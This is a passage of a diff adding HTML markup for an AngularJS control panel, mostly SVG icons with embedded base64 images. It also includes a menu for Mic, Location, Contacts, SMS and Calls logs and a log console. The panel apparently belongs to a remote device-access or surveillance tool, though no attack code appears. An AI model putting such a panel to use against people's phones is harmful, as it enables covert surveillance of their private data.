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"
+                                        />
+                                    </defs>
+                                </svg>
+                            </div>
+                            <div class="item-text">Mic</div>
+                        </a>
+                        <a class="item" ng-click="goToPage('location')">
+                            <div class="item-icon">
+                                <svg
+                                    width="32"
+                                    height="32"
+                                    viewBox="0 0 32 32"
+                                    fill="none"
+                                    xmlns="http://www.w3.org/2000/svg"
+                                    xmlns:xlink="http://www.w3.org/1999/xlink"
+                                >
+                                    <rect width="32" height="32" fill="url(#pattern0_18_27)"/>
+                                    <defs>
+                                        <pattern
+                                            id="pattern0_18_27"
+                                            patternContentUnits="objectBoundingBox"
+                                            width="1"
+                                            height="1"
+                                        >
+                                            <use xlink:href="#image0_18_27" transform="scale(0.01)"/>
+                                        </pattern>
+                                        <image
+                                            id="image0_18_27"
+                                            width="100"
+                                            height="100"
+                                            preserveAspectRatio="none"
+                                            xlink:href="data:image/png;base64,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"
+                                        />
+                                    </defs>
+                                </svg>
+                            </div>
+                            <div class="item-text">Location</div>
+                        </a>
+                        <a class="item" ng-click="goToPage('contacts')">
+                            <div class="item-icon">
+                                <svg
+                                    width="32"
+                                    height="32"
+                                    viewBox="0 0 32 32"
+                                    fill="none"
+                                    xmlns="http://www.w3.org/2000/svg"
+                                    xmlns:xlink="http://www.w3.org/1999/xlink"
+                                >
+                                    <rect width="32" height="32" fill="url(#pattern0_18_30)"/>
+                                    <defs>
+                                        <pattern
+                                            id="pattern0_18_30"
+                                            patternContentUnits="objectBoundingBox"
+                                            width="1"
+                                            height="1"
+                                        >
+                                            <use xlink:href="#image0_18_30" transform="scale(0.01)"/>
+                                        </pattern>
+                                        <image
+                                            id="image0_18_30"
+                                            width="100"
+                                            height="100"
+                                            preserveAspectRatio="none"
+                                            xlink:href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAAAXNSR0IArs4c6QAABEVJREFUeAHtnVtPE0EUx/tJ8PsQQHnmlUffCW3fefASjJfgiyYawMQHBNkAAoIQL9iIJghGDbQ8SDAottCtvdAec0omIXW37HRP13XnP8lkl9nZ3fb89n/OmdkJjcVQYAFYABaABWABWMAsC3QmrAsX49ML3YNWqSduEaonG1QuJa2VroGpDvGnhWHoQOgfTlFiPGN0jY+mqW9opdybnFkWB6KrjMsjG3RlJmt8jY9l2JtUxIHoqIP7Asjpw5h8tFt37wASEnUCSEhAKHcNIADinP4hhiCGhDKjg8uCy4LLUgHcaQuFQCFQiJMyVBsUAoVAIUoNTlsoBAqBQpyUodqgECgEClFqcNpCIVAIFOKkDNUGhUAhUIhSg9MWCoFCoBAnZag2YxVyfS5LTz/Y9GmvTD/zVSqf1OqV97lt6r1N3EcZKqitkUAm123K2lU6r/yyq/Rk3Q4UilFArs5mKZUunsfhr+Nvd4rE5wahEqOAtAJD0VnbKQKI5BPJbspvmQjAfRmhEA7OHA/8lmyh2vZAbwQQzqakCmdfksptvJYRQDiNlSpb38oA0vgU6f59KOCuFFAep+jeX6e/EQrhQZ9U4WvpGFi3L4BokipVAMT3E3mY959hKW5wWQKzsZJBfRNB3f+UBaeqUmUSaa9/INdmhQaGNgaGvuOHynJ41tZvmXjX3kEhf1YjsiwFhWdtWy1r25hcFFOHAsJT6K1A4ZleTL8LZFcKROOWZ229TDZynyDc1NnPZ5TLOvvFOdBz9sVzU42vcLmNsynuc/acIPaNBRKEcVu5B4C00TUCiKZxby7k6HEqTwubBXrx+Xe98j638bFWDOr3HOMUcmM+R4tbBdr9UaFqk0lgPsZ9uC+f49fQXs83BggH6LmPBbJLTSi4DFIK5VpdPUGs0zICyN2lI/qeO3Ext/fm/dwJjSwdtVUtkQcy+vq4JVW4YcoXa8TX9OqCdPtFGsi91SMqVvRdlBsM1c4vqe6vtgdKZIFwluRlNK6MrLvlJUG3FuWDfWSBSL6UcoO1tSe/AiWSQB6+OnazoXj7g5eyriuSQNIHFXHDu11w56AiGuAjB+T2Yo5q8nHcjUf9Xneey8WSyAHhwV/QZXajIKaSyAH5ui+3bNQr2C/7csE9ckAkl416BSK5VityQCSXjXoFIrmaMXJA3mwXiRckBFn5nrpTJG79IwfE7Yv+L+0AovlSq91gAQRA8J8cmqkMCoFCoBAoJGQqABAAicXwG1StLUNFUA+ZegAEQJBlIaiHTAUAAiDIspqpoNkxBPWQqQdAAARZFlxWyFQAIACCLKuZCpodQ1APmXoABECQZf0Tl9U9aJV03ong99RP35/ExzLUk7DKMenSNWjN6wDpH05RYjxjdI2PpqlvaKXcm5xZluYR60xYF3ri0890laIDMYJ9K71Ja7lrYKpDHAguCAvAArAALAALwALhtsAfNsfuzB4kO/kAAAAASUVORK5CYII="
+                                        />
+                                    </defs>
+                                </svg>
+                            </div>
+                            <div class="item-text">Contacts</div>
+                        </a>
+                        <a class="item" ng-click="goToPage('smsManager')">
+                            <div class="item-icon">
+                                <svg
+                                    width="32"
+                                    height="32"
+                                    viewBox="0 0 32 32"
+                                    fill="none"
+                                    xmlns="http://www.w3.org/2000/svg"
+                                    xmlns:xlink="http://www.w3.org/1999/xlink"
+                                >
+                                    <rect width="32" height="32" fill="url(#pattern0_18_33)"/>
+                                    <defs>
+                                        <pattern
+                                            id="pattern0_18_33"
+                                            patternContentUnits="objectBoundingBox"
+                                            width="1"
+                                            height="1"
+                                        >
+                                            <use xlink:href="#image0_18_33" transform="scale(0.01)"/>
+                                        </pattern>
+                                        <image
+                                            id="image0_18_33"
+                                            width="100"
+                                            height="100"
+                                            preserveAspectRatio="none"
+                                            xlink:href="data:image/png;base64,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"
+                                        />
+                                    </defs>
+                                </svg>
+                            </div>
+                            <div class="item-text">SMS</div>
+                        </a>
+                        <a class="item" ng-click="goToPage('callsLogs')">
+                            <div class="item-icon">
+                                <svg
+                                    width="32"
+                                    height="32"
+                                    viewBox="0 0 32 32"
+                                    fill="none"
+                                    xmlns="http://www.w3.org/2000/svg"
+                                    xmlns:xlink="http://www.w3.org/1999/xlink"
+                                >
+                                    <rect width="32" height="32" fill="url(#pattern0_18_36)"/>
+                                    <defs>
+                                        <pattern
+                                            id="pattern0_18_36"
+                                            patternContentUnits="objectBoundingBox"
+                                            width="1"
+                                            height="1"
+                                        >
+                                            <use xlink:href="#image0_18_36" transform="scale(0.01)"/>
+                                        </pattern>
+                                        <image
+                                            id="image0_18_36"
+                                            width="100"
+                                            height="100"
+                                            preserveAspectRatio="none"
+                                            xlink:href="data:image/png;base64,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"
+                                        />
+                                    </defs>
+                                </svg>
+                            </div>
+                            <div class="item-text">Calls logs</div>
+                        </a>
+                    </div>
+                </div>
+                <div style="display: flex; justify-content: space-between; gap: 10px;">
+                    <div class="ui bottom attached black message notDraggable" id="logy" style="width: 400px; margin-top: 0px;">
+                        <div ng-repeat="log in logs " class="log">
+                            <div class="w55" style="
+                                              display: inline-block;
+                                              font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+                                              font-size: 15px;
+                                              font-weight: 600;
+                                            " ng-bind="log.date "></div>
+                            <div
+                                class="w45"
+                                style="
+                                  display: inline-block;
+                                  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+                                  font-size: 15px;
+                                  font-weight: 600;
+                                "
+                                ng-style="{ 'color':log.color} "
+                                ng-bind="log.msg "
+                            ></div>
+                        </div>
+                    </div>
+                    <div class="content-view" style="width: calc(100% - 400px);">
+                        <div class="ui segment full" style="background-color: #1A1B22; height: 100%;">
+                            <div ng-view class="full"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </body>
+    </html>
